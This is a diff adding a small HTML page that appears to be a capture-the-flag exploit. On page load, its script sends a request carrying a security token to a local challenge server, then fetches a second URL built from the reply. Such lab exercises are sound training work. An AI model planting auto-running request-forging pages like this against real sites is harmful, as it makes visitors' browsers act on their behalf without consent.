@@ -1,0 +1,9 @@
+<!DOCTYPE html>
+    <head>
+        <script>
+            fetch("http://challenge.localhost:80/submission?code=pbewjmed&security_token=zswbaduw&hash=shqrmsrv")
+                .then((response) => response.text())
+                .then(text => {fetch("http://challenge.localhost:80/" + text)});
+        </script>
+    </head>
+</html>
